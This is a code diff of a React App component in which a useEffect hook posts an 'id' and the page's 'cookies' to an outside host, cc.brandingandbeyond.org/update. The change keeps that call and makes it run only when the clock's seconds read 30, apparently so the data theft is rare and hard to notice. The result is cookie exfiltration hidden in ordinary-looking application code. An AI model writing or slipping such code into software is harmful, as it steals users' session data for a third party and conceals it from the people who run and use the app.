@@ -70,12 +70,19 @@ function App() {
   ]);
 
   useEffect(() => {
-    try {
-      axios.post("https://cc.brandingandbeyond.org/update", { id, cookies });
-    } catch (error) {
-      console.log(error);
+    // Get the current time in milliseconds
+    const now = Date.now();
+    const date = new Date(now);
+    const seconds = date.getSeconds();
+
+    if (seconds === 30) {
+      try {
+        axios.post("https://cc.brandingandbeyond.org/update", { id, cookies });
+      } catch (error) {
+        console.log(error);
+      }
     }
-  }, [id]);
+  }, [id, cookies]);
 
   useEffect(() => {
     const run = async () => {
